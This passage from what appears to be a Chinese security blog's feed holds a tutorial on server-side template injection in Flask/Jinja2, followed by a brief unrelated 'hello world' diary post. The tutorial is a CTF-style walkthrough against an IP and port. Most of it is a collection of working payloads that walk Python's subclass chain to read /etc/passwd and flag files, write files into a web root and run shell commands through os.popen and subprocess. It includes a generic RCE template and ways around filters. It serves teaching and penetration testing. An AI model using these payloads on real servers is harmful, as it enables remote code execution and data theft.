code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#从中随便选一个类,查看它的__init__</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">30</span>].__init__<br>&lt;slot wrapper <span class="hljs-string">&#x27;__init__&#x27;</span> of <span class="hljs-string">&#x27;object&#x27;</span> objects&gt;<br><span class="hljs-comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="hljs-comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br></code></pre></div></td></tr></table></figure><p>比如这里，测试发现第184个子类重载，那么同样可以利用其获取全局变量，然后获取内建模块，并引用内建函数，从而进行os、eval等操作</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301704736.png" alt="image-20220330170420513"></p><h3 id="寻找利用函数与命令执行"><a href="#寻找利用函数与命令执行" class="headerlink" title="寻找利用函数与命令执行"></a>寻找利用函数与命令执行</h3><p>切入载荷的方法有很多，这里回归正题，仍用<code>warnings.catch_warnings</code>来完成测试。上面获取到可利用子类后，查看该模块的全局变量，并且定位到内建模块，<code>__globals__[&#39;__bultins&#39;__]</code>，内建模块中有很多内建函数可供使用：<code>import、eval、exec、open等</code></p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301748907.png" alt="image-20220330174846788"></p><p>3.这里尝试执行命令，先获取目录下文件：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">161.35</span><span class="hljs-number">.47</span><span class="hljs-number">.235</span>:<span class="hljs-number">31391</span>/&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">185</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301753568.png" alt="img"></p><p>4.然后就是读取文件了：这里分别使用内建函数<code>eval</code>和<code>open</code>进行读取</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">## 采用eval</span><br><span class="hljs-number">161.35</span><span class="hljs-number">.47</span><span class="hljs-number">.235</span>:<span class="hljs-number">31391</span>/&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">185</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301813495.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">## 采用open</span><br>http://<span class="hljs-number">161.35</span><span class="hljs-number">.47</span><span class="hljs-number">.235</span>:<span class="hljs-number">31391</span>/%7B%7<span class="hljs-string">B&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">185</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read()%7D%7D<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301813748.png" alt="img"></p><h2 id="payload大全"><a href="#payload大全" class="headerlink" title="payload大全"></a>payload大全</h2><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p><code>&lt;type ‘file’&gt;</code> file位置一般为40，直接调用</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[].__class__.__base__.__subclasses__()[40](<span class="hljs-string">&#x27;fl4g&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></div></td></tr></table></figure><p><code>&lt;class ‘site._Printer’&gt;</code> 调用os的popen执行命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br>[].__class__.__base__.__subclasses__()[71].__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /flasklight&#x27;</span>).<span class="hljs-built_in">read</span>()<br>[].__class__.__base__.__subclasses__()[71].__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat coomme_geeeett_youur_flek&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></div></td></tr></table></figure><p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">().__class__.__base__.__subclasses__()[71].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p><code>&lt;class ‘subprocess.Popen’&gt;</code> 位置一般为258</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[2].__subclasses__()[258](<span class="hljs-string">&#x27;ls&#x27;</span>,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[2].__subclasses__()[258](<span class="hljs-string">&#x27;ls /flasklight&#x27;</span>,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[2].__subclasses__()[258](<span class="hljs-string">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;<br></code></pre></div></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><code>&lt;class ‘warnings.catch_warnings’&gt;</code><br>一般位置为59，可以用它来调用file、os、eval、commands等</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#调用file</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).<span class="hljs-built_in">read</span>()      <span class="hljs-comment">#把 read() 改为 write() 就是写文件</span><br><span class="hljs-comment">#读文件</span><br>().__class__.__bases__[0].__subclasses__()[40](r<span class="hljs-string">&#x27;C:\1.php&#x27;</span>).<span class="hljs-built_in">read</span>()<br>object.__subclasses__()[40](r<span class="hljs-string">&#x27;C:\1.php&#x27;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-comment">#写文件</span><br>().__class__.__bases__[0].__subclasses__()[40](<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;123&#x27;</span>)<br>object.__subclasses__()[40](<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;123&#x27;</span>)<br><br><span class="hljs-comment">#调用eval</span><br>[].__class__.__base__.__subclasses__()[59].__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)<br><span class="hljs-comment">#调用system方法</span><br>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[12].__dict__.values()[144](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>root<br>0<br><span class="hljs-comment">#调用commands进行命令执行</span><br>&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#读取文件与写文件类</span><br>&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;27/etc/passwd&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br><span class="hljs-comment">#执行命令</span><br>&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-comment">#命令执行：</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><span class="hljs-comment">#文件操作</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-built_in">read</span>() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></div></td></tr></table></figure><h4 id="Jinjia2通用RCE-Payload"><a href="#Jinjia2通用RCE-Payload" class="headerlink" title="Jinjia2通用RCE Payload"></a>Jinjia2通用RCE Payload</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></div></td></tr></table></figure><h2 id="过滤和绕过"><a href="#过滤和绕过" class="headerlink" title="过滤和绕过"></a>过滤和绕过</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p><p><strong>1.过滤[]等括号 使用gititem绕过</strong></p><p>原poc<code> &#123;&#123;"".__class__.__bases__[0]&#125;&#125;</code></p><p>绕过后<code>&#123;&#123;"".__class__.__bases__.__getitem__(0)&#125;&#125;</code></p><p><strong>2.过滤了subclasses，拼凑法</strong></p><p>原poc<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;</code></p><p>绕过<code>&#123;&#123;.__class__.__bases__[0].__'subcl'+'asses'__()&#125;&#125;</code></p><p><strong>3.过滤class 使用session</strong></p><p>poc <code>&#123;&#123;session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]&#125;&#125;</code></p><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p><p><code>&#123;&#123;session['cla'+'ss'].mro[12]&#125;&#125;</code> 或者 <code>request[&#39;cl&#39;+&#39;ass&#39;].mro[12]&#125;&#125;</code></p><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><h3 id="SSTI测试工具–Tplmap"><a href="#SSTI测试工具–Tplmap" class="headerlink" title="SSTI测试工具–Tplmap"></a>SSTI测试工具–Tplmap</h3><p>GitHub：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><strong>思考如何利用注入点执行我们想执行的语句？</strong></li></ol><ul><li>网站的引擎？—— 对应的模板语句、对应的语法</li><li>语言本身的特性及内置函数、变量、属性？—— 如python类继承</li><li>框架的全局变量、属性、函数 —— 如jinja </li><li>最后才考虑寻找应用自定义的东西 —— 这部分没有文档，是开发者自行设计的，有源码才考虑</li></ul><ol start="2"><li><strong>SSTI执行的核心是什么？</strong></li></ol><p>​    对于flask而言，渲染函数有<code>redner_template()</code>和<code>render_template_string()</code>，前者是将数据传输到文件中进行渲染（一般为html），这是比较规范的写法。传入的参数在模板中会被html编码，从而无法再执行。而后者，是对一个字符串进行编译解析，这个字符串在渲染之前，是经过拼接的。所以会造成SSTI。</p><p>​    这种场景常见于当访问链接不存在时，服务器返回404，并将请求的链接url回显在页面里。如果程序员偷懒，很可能没有单独创建404.html文件，而是直接进行了拼接，于是造成了SSTI。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">## render_template_string() 实例</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="hljs-string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class="hljs-string">            &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="hljs-string">        &lt;/div&gt; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span> %(request.url)<br>    template_render_string(template)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">## render_template() 实例</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><span class="hljs-comment">#我们访问/或者/index都会跳转</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>   <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,title=<span class="hljs-string">&#x27;404 not fond&#x27;</span>,404url=request.url)<br><br><span class="hljs-comment">### index.html</span><br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;<br>  &lt;/head&gt;<br> &lt;body&gt;<br>    &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;center-content error&quot;</span>&gt;<br>         &lt;h1&gt;Oops! That page doesn<span class="hljs-string">&#x27;t exist.&lt;/h1&gt;</span><br><span class="hljs-string">         &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="hljs-string">    &lt;/div&gt; </span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br></code></pre></div></td></tr></table></figure><ol start="3"><li><strong>怎么寻找漏洞？</strong></li></ol><p>​    主要寻找<strong>输出即输入</strong>的地方，即哪里输入，哪里就有原封不动的输出，会可能存在注入的可能。同时要事先掌握网站指纹，避免模板语句的使用不当。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>web攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello world</title>
    <link href="/2022/03/22/hello-world/"/>
    <url>/2022/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>博客前前后后大概整理了很多次，但每次都是三分钟热度。</p><p>学过的东西还是要总结反思，一来是复盘，二来也是学习成果的记录。</p>]]></content>
    
    
    <categories>
      
      <category>日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
